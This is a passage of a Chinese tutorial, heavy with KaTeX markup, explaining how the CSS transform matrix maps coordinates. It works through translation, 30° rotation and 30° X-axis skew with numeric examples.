class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">a</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">b</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">c</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">d</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">e</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">x</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></p>
<p>矩阵乘法规则为「前矩阵行 × 后矩阵列，求和得到结果」：</p>
<ul>
<li>第一行运算：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mi>a</mi><mo>×</mo><mi>x</mi><mo>+</mo><mi>c</mi><mo>×</mo><mi>y</mi><mo>+</mo><mi>e</mi><mo>×</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x' = a \times x + c \times y + e \times 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>，即 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mi>a</mi><mo>∗</mo><mi>x</mi><mo>+</mo><mi>c</mi><mo>∗</mo><mi>y</mi><mo>+</mo><mi>e</mi></mrow><annotation encoding="application/x-tex">x' = a*x + c*y + e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.4653em;"/><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.4653em;"/><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">e</span></span></span></span></span>；</li>
<li>第二行运算：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mi>b</mi><mo>×</mo><mi>x</mi><mo>+</mo><mi>d</mi><mo>×</mo><mi>y</mi><mo>+</mo><mi>f</mi><mo>×</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">y' = b \times x + d \times y + f \times 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"/><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>，即 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mi>b</mi><mo>∗</mo><mi>x</mi><mo>+</mo><mi>d</mi><mo>∗</mo><mi>y</mi><mo>+</mo><mi>f</mi></mrow><annotation encoding="application/x-tex">y' = b*x + d*y + f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></span>；</li>
<li>第三行固定为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>，是齐次坐标的约定，目的是让平移（e、f）能融入矩阵乘法，否则纯线性变换无法实现平移效果。</li>
</ul>
<h2 data-id="heading-4">三、实例验证：用公式拆解基础变换</h2>
<p>结合具体变换场景代入公式，能更直观理解参数与公式的联动效果，以下均以单位矩阵（无变换：matrix(1,0,0,1,0,0)）为基准。</p>
<h3 data-id="heading-5">1. 纯平移（matrix(1,0,0,1,50,30)）</h3>
<p>参数代入：a=1、b=0、c=0、d=1、e=50、f=30</p>
<p>公式计算：</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mn>1</mn><mo>∗</mo><mi>x</mi><mo>+</mo><mn>0</mn><mo>∗</mo><mi>y</mi><mo>+</mo><mn>50</mn><mo>=</mo><mi>x</mi><mo>+</mo><mn>50</mn></mrow><annotation encoding="application/x-tex">x' = 1*x + 0*y + 50 = x + 50</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">50</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">50</span></span></span></span></span>（X 轴统一右移 50px）</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mn>0</mn><mo>∗</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo>∗</mo><mi>y</mi><mo>+</mo><mn>30</mn><mo>=</mo><mi>y</mi><mo>+</mo><mn>30</mn></mrow><annotation encoding="application/x-tex">y' = 0*x + 1*y + 30 = y + 30</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">30</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">30</span></span></span></span></span>（Y 轴统一下移 30px）</p>
<p>效果：所有点的坐标仅叠加平移量，元素整体移动，无缩放、倾斜。</p>
<h3 data-id="heading-6">2. 纯旋转（顺时针旋转 30°，matrix(0.866,0.5,-0.5,0.866,0,0)）</h3>
<p>参数对应：cos30°≈0.866、sin30°=0.5，即 a=cosθ、b=sinθ、c=-sinθ、d=cosθ</p>
<p>公式计算（以原始点 (100, 0) 为例）：</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mn>0.866</mn><mo>∗</mo><mn>100</mn><mo>+</mo><mo stretchy="false">(</mo><mo>−</mo><mn>0.5</mn><mo stretchy="false">)</mo><mo>∗</mo><mn>0</mn><mo>+</mo><mn>0</mn><mo>≈</mo><mn>86.6</mn></mrow><annotation encoding="application/x-tex">x' = 0.866*100 + (-0.5)*0 + 0 ≈ 86.6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.866</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">100</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">−</span><span class="mord">0.5</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">86.6</span></span></span></span></span></p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mn>0.5</mn><mo>∗</mo><mn>100</mn><mo>+</mo><mn>0.866</mn><mo>∗</mo><mn>0</mn><mo>+</mo><mn>0</mn><mo>=</mo><mn>50</mn></mrow><annotation encoding="application/x-tex">y' = 0.5*100 + 0.866*0 + 0 = 50</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.5</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">100</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.866</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">50</span></span></span></span></span></p>
<p>效果：原始点 (100,0) 旋转后变为 (86.6,50)，符合顺时针旋转 30° 的坐标变化，跨轴项 c<em>y、b</em>x 在此处实现了旋转的偏移调节。</p>
<h3 data-id="heading-7">3. 纯倾斜（X 轴倾斜 30°，matrix(1,0,0.577,1,0,0)）</h3>
<p>参数对应：tan30°≈0.577，即 c=tanφ（φ 为倾斜角度）</p>
<p>公式计算（以原始点 (0, 100) 为例）：</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mn>1</mn><mo>∗</mo><mn>0</mn><mo>+</mo><mn>0.577</mn><mo>∗</mo><mn>100</mn><mo>+</mo><mn>0</mn><mo>≈</mo><mn>57.7</mn></mrow><annotation encoding="application/x-tex">x' = 1*0 + 0.577*100 + 0 ≈ 57.7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.577</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">100</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">57.7</span></span></span></span></span></p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mn>0</mn><mo>∗</mo><mn>0</mn><mo>+</mo><mn>1</mn><mo>∗</mo><mn>100</mn><mo>+</mo><mn>0</mn><mo>=</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">y' = 0*0 + 1*100 + 0 = 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span 